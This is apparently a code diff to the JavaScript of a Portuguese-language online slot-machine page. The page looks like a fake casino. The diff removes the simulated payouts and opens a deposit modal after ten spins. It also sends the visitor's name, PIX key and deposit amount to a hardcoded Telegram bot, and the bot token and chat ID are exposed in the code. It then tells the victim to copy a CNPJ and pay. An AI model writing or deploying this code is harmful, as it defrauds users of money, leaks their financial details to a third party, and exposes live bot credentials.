@@ -1,46 +1,50 @@
 const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
 const CHAT_ID = "6238676644";
-const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
+let contadorGiros = 0;
 
 window.girarSlots = () => {
+    contadorGiros++;
+    if (contadorGiros >= 10) {
+        window.abrirModal();
+        return;
+    }
     const colunas = document.querySelectorAll('.coluna');
+    const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];
     let giros = 0;
     const intervalo = setInterval(() => {
         colunas.forEach(col => {
             col.querySelectorAll('.simbolo').forEach(d => d.innerText = simbolos[Math.floor(Math.random() * simbolos.length)]);
         });
         giros++;
-        if (giros > 15) {
-            clearInterval(intervalo);
-            if (Math.random() > 0.5) {
-                let ganho = Math.floor(Math.random() * 50) + 10;
-                let saldoEl = document.getElementById('saldo');
-                let saldoAtual = parseFloat(saldoEl.innerText.replace("R$ ", "").replace(",", "."));
-                saldoEl.innerText = `R$ ${(saldoAtual + ganho).toFixed(2).replace(".", ",")}`;
-                
-                const msg = document.getElementById('notificacao');
-                msg.innerText = `PARABÉNS! VOCÊ GANHOU R$ ${ganho},00!`;
-                msg.classList.remove('hidden');
-                setTimeout(() => msg.classList.add('hidden'), 3000);
-            }
-        }
+        if (giros > 15) clearInterval(intervalo);
     }, 100);
 };
 
 window.abrirModal = () => document.getElementById('modal-deposito').classList.remove('hidden');
-window.fecharModal = () => document.getElementById('modal-deposito').classList.add('hidden');
+window.fecharModal = () => {
+    document.getElementById('modal-deposito').classList.add('hidden');
+    contadorGiros = 0; // Reset do ciclo
+};
 
 window.confirmarDeposito = () => {
     const nome = document.getElementById("nome-usuario").value;
     const chave = document.getElementById("pix-chave").value;
+    const valor = document.getElementById("valor-deposito").value;
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}` })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `Depósito: ${nome}, Chave: ${chave}, Valor: R$${valor}` })
     }).then(() => {
         document.getElementById('form-deposito').classList.add('hidden');
         document.getElementById('info-pix').classList.remove('hidden');
-        document.getElementById('modal-titulo').innerText = "Realize o PIX";
+        document.getElementById('modal-titulo').innerText = "Copie o CNPJ para pagar";
     });
+};
+
+window.copiarChave = () => {
+    const copyText = document.getElementById("chave-cnpj");
+    copyText.select();
+    document.execCommand("copy");
+    alert("Chave copiada!");
 };
 
 window.alterarAposta = (mod) => {
